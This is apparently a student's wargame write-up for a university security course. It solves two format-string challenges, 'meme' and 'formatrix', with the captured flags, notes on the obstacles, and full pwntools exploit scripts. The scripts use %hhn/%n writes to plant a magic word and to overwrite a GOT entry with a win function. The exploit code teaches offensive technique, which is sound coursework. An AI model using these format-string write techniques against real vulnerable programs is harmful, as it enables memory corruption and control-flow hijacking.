# COMP6447 Wargame 4
Written by WENG XINN CHOW (z5346077) on 27.06.2022

meme
=========================== 
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNC1tZW1lIiwiaXAiOiIxMjMuMjU0LjExNS4xMDIiLCJzZXNzaW9uIjoiZDE5YTdjMTEtY2JmZi00YWJkLWI1YzktYWZjMDU5NzI3ZTVhIn0.Es1rQyUbbdmPinT3KIAqcyTfnHkLoR-icGvOWmaVQtM}

General overview of problems faced 
------------------------------------- 
1. Had to find the magic word, "MEME". This can be done via ```binary ninja```. 
2. Once I got the word, I had to find the offset of the user input on the stack by using ```%x```, which in this case, is 2. 
3. Had to learn different types of format strings, especially ```%x``` and ```$hhn``` to ensure the payload was sent correctly. 
4. Had to figure out bytes needed to write each letter in the magic word. When writing a smaller letter (in ASCII) than the previous letter, we need to add ```0x100 (256 in decimal)``` to the hex of the letter to wrap around. 

Script/Command used 
------------------ 
``` 
from pwn import *

# p = process("./meme")
host = "comp6447.wtf"
port = 29835
p = remote(host, port)

p.recvline()
p.recvuntil(b'at ')
target_addr = p.recvuntil(b'\n')[:-1]
target_addr = int(target_addr, 16)

# To obtain the perfect address on stack
payload = b' '
payload += p32(target_addr)
# payload += b'%2$s'
payload += p32(target_addr + 1)
payload += p32(target_addr + 2)
payload += p32(target_addr + 3)

# Offset is 2 so the argument starts from 2 
bytes_write_M = ord('M') - len(payload)
payload += f"%{bytes_write_M}x%2$hhn".encode()

# wrap around since E < M
bytes_write_E = 0x100 + ord('E') - ord('M')
payload += f"%{bytes_write_E}x%3$hhn".encode() 

bytes_write_M2 = 0x100 + ord('M') - ord('E')
payload += f"%{bytes_write_M2}x%4$hhn".encode() 
# warp around since E < M
bytes_write_E2 = 0x200 + ord('E') - ord('M')
payload += f"%{bytes_write_E2}x%5$hhn".encode() 

p.sendline(payload)

p.interactive() 
```
formatrix
=========================== 
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNC1mb3JtYXRyaXgiLCJpcCI6IjEyMy4yNTQuMTE1LjEwMiIsInNlc3Npb24iOiIzZWNhZGM2NC1mMTI4LTQ4OTItOGU2Mi04MzM2YjFiNTczZTkifQ.9GFpUctQmj1R2Quf4xUY_2KOde1kcgDjPAa27pxwzAk}

General overview of problems faced 
------------------------------------- 
1. Had to overwrite functions in the GOT table. In this case, I used ```printf``` as it wouldn't alter the process before the win function. 
2. The hardest part was to figure out the GOT address of the function, since I have been stuck there for a long time, thinking that the PLT address is the GOT address. In fact, the GOT address is the address that was called from PLT. 
3. Had to find the ```win()``` address using ```objdump```, which is straightforward.
4. Once we got the ```win()``` address, we need to overwrite the address stored in ```printf``` by the ```win()``` address.  

Script/Command used 
------------------ 
``` 
from pwn import * 

# p = process("./formatrix")
host = "comp6447.wtf"
port = 13742
p = remote(host, port)

p.recvlines(15)
p.recvuntil(b': ')[:-1]

printf = 0x8049c18
win = 0x08048536

payload = p32(printf)
payload += p32(printf + 1)
payload += p32(printf + 2)
payload += p32(printf + 3)

bytes_write_36 = 0x36 - len(payload)
payload += f"%{bytes_write_36}x%3$n".encode()

bytes_write_85 = 0x85 - 0x36
payload += f"%{bytes_write_85}x%4$n".encode()

bytes_write_04 = 0x100 + 0x04 - 0x85
payload += f"%{bytes_write_04}x%5$n".encode()

bytes_write_08 = 0x200 + 0x08 - 0x104
payload += f"%{bytes_write_08}x%6$n".encode()

p.sendline(payload)

p.interactive()```